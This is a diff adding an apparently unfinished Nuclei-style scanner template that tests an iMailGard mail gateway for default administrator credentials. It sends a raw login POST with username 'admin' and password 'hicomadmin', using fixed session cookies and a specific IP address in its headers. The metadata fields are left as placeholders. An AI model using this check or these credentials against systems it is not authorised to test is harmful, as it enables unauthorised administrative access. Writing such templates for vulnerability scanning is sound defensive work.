@@ -1,0 +1,38 @@
+id: imailgard-default-login
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /index.php?c=user&a=ajax_save HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: FWSESSID=48674e2c19c7b4b8ce004fc1587f023a; PHPSESSID=48674e2c19c7b4b8ce004fc1587f023a
+        Content-Length: 49
+        Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
+        Accept: application/json, text/javascript, */*; q=0.01
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+        Sec-Ch-Ua-Platform: "macOS"
+        Origin: https://113.107.244.146:888
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: https://113.107.244.146:888/index.php
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        username=admin&password=hicomadmin&language=zh-cn
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
